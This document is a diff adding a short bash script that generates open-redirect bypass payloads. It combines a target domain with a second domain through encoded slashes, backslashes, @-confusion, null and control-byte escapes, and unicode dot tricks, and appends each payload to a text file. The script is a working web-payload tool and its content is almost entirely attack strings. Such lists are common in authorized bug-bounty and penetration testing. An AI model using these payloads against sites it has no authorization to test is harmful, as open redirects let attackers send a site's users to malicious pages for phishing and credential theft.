@@ -1,0 +1,27 @@
+#!/bin/bash
+# ./url_redir_payload_generation targetwebsitename google
+thiersites=$1
+mysite=$2
+
+echo '\/'$2'.com'|tee -a url_red.txt
+echo '\/\/'$2'.com'|tee -a url_red.txt
+echo '\\'$2'.com'|tee -a url_red.txt
+echo '//'$2'.com'|tee -a url_red.txt
+echo '//'$1'@'$2'.com'|tee -a url_red.txt
+echo '/\/'$2'.com'|tee -a url_red.txt
+echo 'https://'$2'.com%3F.'$1'.com/'|tee -a url_red.txt
+echo 'https://'$2'.com%2523.'$1'.com/'|tee -a url_red.txt
+echo 'https://'$2'.com?c=.'$1'.com/'|tee -a url_red.txt
+echo 'https://'$2'.com?c=.'$1'.com\'|tee -a url_red.txt
+echo '//%2F/'$2'.com'|tee -a url_red.txt
+echo '////'$2'.com'|tee -a url_red.txt
+echo 'https://'$1'.computer/'|tee -a url_red.txt
+echo 'https://'$1'.com.'$2'.com'|tee -a url_red.txt
+echo '/%0D/'$2'.com'|tee -a url_red.txt
+echo '/%2F/'$2'.com'|tee -a url_red.txt
+echo '/%09/'$2'.com'|tee -a url_red.txt
+echo '/%00/'$2'.com'|tee -a url_red.txt
+echo '/%07/'$2'.com'|tee -a url_red.txt
+echo '/%0a/'$2'.com'|tee -a url_red.txt
+echo '/%5C'$2'.com'|tee -a url_red.txt
+echo '//'$2'%E3%80%82com'|tee -a url_red.txt
